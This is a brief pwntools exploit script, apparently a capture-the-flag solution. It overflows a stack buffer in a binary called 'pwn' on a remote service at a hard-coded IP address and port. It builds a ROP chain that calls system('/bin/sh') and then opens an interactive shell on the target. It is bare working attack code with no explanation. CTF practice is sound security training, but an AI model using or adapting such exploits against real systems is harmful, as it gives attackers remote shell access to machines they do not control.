from pwn import *

context.os = 'linux'
context.arch = 'amd64'
context.log_level = 'DEBUG'

# sh = process(['./pwn'])
sh = remote("43.155.90.127", 10001)
elf = ELF('./pwn')

system_addr = elf.plt['system']
bin_sh_addr = 0x0402004
pop_rdi_ret = 0x0401203
ret = 0x040101a

sh.recvuntil(b'hello bof!')
payload = b'A'*0x78 + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(ret) + p64(system_addr)
sh.sendline(payload)
sh.interactive()